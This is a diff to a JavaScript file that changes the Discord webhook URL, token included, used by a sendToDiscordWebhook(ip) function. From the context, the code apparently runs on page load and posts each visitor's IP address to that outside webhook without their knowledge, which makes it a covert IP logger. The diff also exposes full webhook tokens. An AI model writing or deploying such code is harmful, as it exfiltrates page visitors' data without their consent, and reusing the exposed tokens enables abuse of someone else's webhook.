@@ -9,7 +9,7 @@ window.addEventListener('load', function() {
       });
   
     function sendToDiscordWebhook(ip) {
-      var webhookURL = 'https://discord.com/api/webhooks/1111705086830325901/a5s-Em5pPg_uQlxhpVdhdNTqbqqJqcSffKPWX15MTzCxa0SIkXDO0FrJQLVUVU6FcXD6'; 
+      var webhookURL = 'https://discord.com/api/webhooks/1113803195672694864/pxmy0jo75OrUY0nbmMzi3m1W3x3GkaL6_Mb28EPGGAyNyoh52xbs46d15Ql4dqAOt9Hs'; 
   
       fetch(webhookURL, {
         method: 'POST',
